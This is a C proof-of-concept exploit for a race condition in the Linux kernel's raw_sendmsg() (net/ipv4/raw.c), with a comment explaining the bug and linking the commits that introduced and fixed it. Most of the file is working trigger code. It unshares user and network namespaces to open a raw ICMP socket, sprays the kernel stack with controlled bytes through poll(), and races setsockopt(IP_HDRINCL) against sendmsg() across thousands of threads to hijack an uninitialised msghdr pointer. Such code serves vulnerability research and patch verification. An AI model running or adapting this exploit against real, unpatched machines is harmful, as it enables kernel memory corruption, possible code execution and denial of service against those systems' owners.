/* simo: net/ipv4/raw.c: raw_sendmsg() race condition

There is a race condition in raw_sendmsg() leads to uninitialized use of a stack variable, this might be used to gain code execution.

The bug was introduced  here : https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c008ba5bdc9fa830e1a349b20b0be5a137bdef7a

in net/ipv4/raw.c:
static int raw_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)
{
	...
	struct raw_frag_vec rfv; 				[1]
	...

	...
	if (!inet->hdrincl) { 					[2]
		rfv.msg = msg;
		rfv.hlen = 0;

		err = raw_probe_proto_opt(&rfv, &fl4);
		if (err)
			goto done;
	}
	...
	
	...
	if (inet->hdrincl) 						[3]
		err = raw_send_hdrinc(sk, &fl4, msg, len,
				      &rt, msg->msg_flags, &ipc.sockc);

	 else {
		sock_tx_timestamp(sk, ipc.sockc.tsflags, &ipc.tx_flags);

		if (!ipc.addr)
			ipc.addr = fl4.daddr;
		lock_sock(sk);
		err = ip_append_data(sk, &fl4, raw_getfrag,
				     &rfv, len, 0,				[4]
				     &ipc, &rt, msg->msg_flags);
	...
}

[1] rfv is not initialized and contains a pointer to a msghdr header structure.
[2], [3] There are multiple checks against inet->hdrincl without a lock.

When we achieve (by racing inet->hdrincl via setsockopt()) inet->hdrincl=1 in [1], and inet->hdrincl=0 in [2], rfv variable remains uninitialized and used in [4].
By spraying the stack with controlled user data (this can be achieved by poll() syscall), we can take control of msg pointer which is used later in ip_append_data().

Fixed here :
https://patchwork.ozlabs.org/patch/846641/
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8f659a03a0ba9289b9aeb9b4470e6fb263d6f483
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <poll.h>

#define CHKERR(cond,msg)    if((cond)) {	\
		perror((msg));			\
	}
#define PSIZE		100
#define TIDSIZE		10000

pthread_t tid1[TIDSIZE];
pthread_t tid2[TIDSIZE];


int val0 = 0;
struct msghdr *msg = NULL;
struct sockaddr_in sin= {.sin_port = 0};
struct iovec iov[256];
int i;
unsigned char buf[PSIZE];
char payload[2048];
int fdsock;
void create_ns(void)
{
	if(unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}
	if(unshare(CLONE_NEWNET) != 0) {
		perror("unshared(CLONE_NEWUSER)");
		exit(2);
	}
}

void *do_setsockopt_hdrincl(void *arg)
{
	int err,val;
	val = *(int*)arg;
   
	err = setsockopt(fdsock,SOL_IP,IP_HDRINCL,&val,4); 
	CHKERR(err,"setsockopt_int");
	return NULL;
}

void do_poll(void)
{
	poll((struct pollfd*)payload,256,0);
}


int create_socket(void)
{
	int fd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
	CHKERR(fd < 0,"socket");
	return fd;
}

struct msghdr *prepare_sendmsg(void)
{
	struct msghdr *msg;

	int off = 156;
	
	memset(buf,0xcc,PSIZE);
	memset(payload,0x00,2048);
	memset(payload+off , 0x11,8);

	for(i=0;i<256;i++) {
		iov[i].iov_base = buf;
		iov[i].iov_len = PSIZE;
	}

	msg = malloc(sizeof(struct msghdr));
	if(!msg) {
		perror("malloc");
		exit(-1);
	}
	memset(msg,0,sizeof(struct msghdr));
	memset(&sin,0,sizeof(sin));
	
	msg->msg_name = &sin;
	msg->msg_namelen = sizeof(sin);
	msg->msg_iov = iov;
	msg->msg_iovlen = 256;
	msg->msg_control = NULL;
	msg->msg_controllen = 0;
	msg->msg_flags = 0;
	return msg;
}
void *do_sendmsg_for_race(void *arg)
{
	int val = 1;
	int fd = *(int*)arg;

	setsockopt(fd,SOL_IP,IP_HDRINCL,&val,4);
	do_poll();
	sendmsg(fd,msg,0);
	
	return NULL;
}

void racy(void)
{
	int i;
	
	for(i=0;i<TIDSIZE;i++) {
		pthread_create(&tid1[i],NULL,do_setsockopt_hdrincl,(void*)&val0);
		pthread_create(&tid2[i],NULL,do_sendmsg_for_race,(void*)&fdsock);
	
	}
	for(i=0;i<TIDSIZE;i++) {
		pthread_join(tid1[i],NULL);
		pthread_join(tid2[i],NULL);
	}

}
int main(int argc,char **argv)
{
	create_ns();
	fdsock = create_socket();
	msg = prepare_sendmsg();
	
	racy();
	
	return 0;
	
}
